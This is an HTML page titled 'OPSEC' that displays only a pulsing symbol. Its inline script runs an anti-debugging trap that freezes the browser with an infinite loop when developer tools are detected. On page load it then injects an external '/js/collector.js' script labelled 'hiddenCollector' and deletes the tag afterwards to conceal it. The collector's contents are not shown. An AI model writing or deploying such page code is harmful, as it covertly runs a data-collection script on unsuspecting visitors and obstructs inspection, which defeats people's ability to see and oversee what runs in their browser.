<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OPSEC</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: monospace;
            overflow: hidden;
        }
        .symbol {
            font-size: 20rem;
            color: #1a1a1a;
            text-shadow: 0 0 80px rgba(100, 100, 100, 0.05);
            user-select: none;
            animation: pulse 4s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.6; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.02); }
        }
        #status {
            position: fixed;
            bottom: 16px;
            right: 20px;
            font-size: 0.65rem;
            color: #1a1a1a;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="symbol">⏣</div>
    <div id="status">●</div>

    <script>

        function detectDevTools() {
            const start = performance.now();
            debugger;
            const end = performance.now();
            if (end - start > 100) {
                while (true) {}
            }
        }

        function loadAndHideScript() {
            detectDevTools();

            const script = document.createElement('script');
            script.id = 'hiddenCollector';
            script.src = '/js/collector.js';

            script.onload = function() {
                const scriptElement = document.getElementById('hiddenCollector');
                if (scriptElement) {
                    scriptElement.remove();
                }
            };

            document.body.appendChild(script);
        }

        setTimeout(loadAndHideScript, 500);
    </script>
</body>
</html>
